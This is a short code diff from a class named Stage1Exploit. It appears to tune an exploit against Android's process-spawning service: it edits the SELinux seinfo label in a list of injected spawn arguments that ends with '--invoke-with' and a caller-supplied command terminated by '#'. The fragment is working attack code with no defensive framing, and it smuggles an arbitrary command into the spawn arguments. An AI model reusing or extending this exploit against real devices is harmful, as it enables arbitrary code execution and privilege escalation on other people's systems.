@@ -194,7 +194,7 @@ class Stage1Exploit:
             "--setgroups=3003",
             "--runtime-args",
             "--nice-name=cnd",
-            "--seinfo=cnd:complete",
+            "--seinfo=cnd_exec:complete",
             "--runtime-flags=32767",
             "--invoke-with",
             f"{command}#",
